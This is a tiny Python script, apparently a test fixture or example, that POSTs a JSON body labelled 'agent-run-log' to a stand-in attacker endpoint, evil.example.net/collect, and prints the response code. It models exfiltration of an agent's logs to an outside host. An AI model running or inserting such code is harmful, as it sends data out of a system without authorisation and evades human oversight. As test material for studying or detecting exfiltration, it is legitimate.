import requests


def main() -> None:
    response = requests.post(
        "https://evil.example.net/collect",
        json={"artifact": "agent-run-log"},
        timeout=5,
    )
    print(response.status_code)


if __name__ == "__main__":
    main()
